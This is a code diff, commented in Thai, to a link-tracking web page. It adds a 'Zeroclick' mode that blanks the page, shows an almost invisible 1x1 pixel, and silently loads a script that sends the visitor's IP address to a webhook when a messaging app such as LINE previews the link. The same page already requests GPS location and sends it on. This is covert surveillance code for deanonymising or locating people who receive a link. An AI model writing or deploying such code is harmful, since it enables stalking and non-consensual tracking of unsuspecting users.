@@ -103,12 +103,23 @@
       }
     }
 
+    // ฟังก์ชันตรวจสอบว่าเป็น Zeroclick preview หรือไม่
+    function isZeroclickPreview() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('preview') === '1' && urlParams.get('source') === 'zeroclick';
+      } catch (error) {
+        console.error("Error checking preview:", error);
+        return false;
+      }
+    }
+
     // ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook (ย้ายมาไว้ที่นี่เพื่อให้เรียกใช้ได้)
     function sendDataToWebhook(trackingKey, location, source) {
       // สร้างออบเจ็กต์ข้อมูล
       const data = {
         trackingKey: trackingKey,
-        source: source, // ระบุว่ามาจากรูปภาพหรือลิงก์
+        source: source, // ระบุว่ามาจากรูปภาพหรือลิงก์ หรือ zeroclick
         location: location, // ข้อมูลตำแหน่ง GPS
         timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
         // ข้อมูลอื่นๆ จะถูกเพิ่มใน script.js
@@ -119,8 +130,42 @@
       console.log("Prepared data for webhook (will be sent by script.js):", data);
     }
 
-    // ตรวจสอบ tracking key ก่อนที่จะโหลด script.js
-    if (hasValidTrackingKey()) {
+    // ตรวจจับ Zeroclick และดำเนินการ
+    if (isZeroclickPreview() && hasValidTrackingKey()) {
+      console.log("Detected Zeroclick preview request. Loading minimal resources...");
+      
+      // สร้างภาพโปร่งใสขนาด 1x1 pixel และรีเทิร์นเพื่อให้การโหลดเร็วที่สุด
+      // LINE จะได้รับภาพเล็กๆ และข้อมูล IP ของผู้ใช้จะถูกส่งมาที่เซิร์ฟเวอร์
+      const scriptElement = document.createElement('script');
+      scriptElement.textContent = `
+        // ทำให้หน้าว่าง
+        document.body.innerHTML = '';
+        document.body.style.margin = '0';
+        document.body.style.padding = '0';
+        document.body.style.background = 'transparent';
+        document.body.style.overflow = 'hidden';
+        
+        // สร้างภาพใส 1x1 pixel
+        const img = document.createElement('img');
+        img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+        img.width = 1;
+        img.height = 1;
+        img.style.opacity = '0.01';
+        document.body.appendChild(img);
+        
+        // โหลดสคริปต์หลักเพื่อส่งข้อมูล IP แต่ไม่แสดงเนื้อหาหน้าเว็บ
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingKey = urlParams.get('daily');
+        const silent = true; // Flag สำหรับโหมดเงียบ (ไม่แสดงเนื้อหา)
+        const source = 'zeroclick'; // ระบุว่าเป็นการเข้าถึงแบบ Zeroclick
+        
+        // โหลด script.js ซึ่งจะส่งข้อมูล IP ไป webhook แม้ไม่แสดงเนื้อหา
+        const scriptMain = document.createElement('script');
+        scriptMain.src = 'script.js';
+        document.body.appendChild(scriptMain);
+      `;
+      document.body.appendChild(scriptElement);
+    } else if (hasValidTrackingKey()) {
       console.log("Tracking key is valid. Loading main script...");
       
       // ขอสิทธิ์เข้าถึงตำแหน่ง GPS ทันที
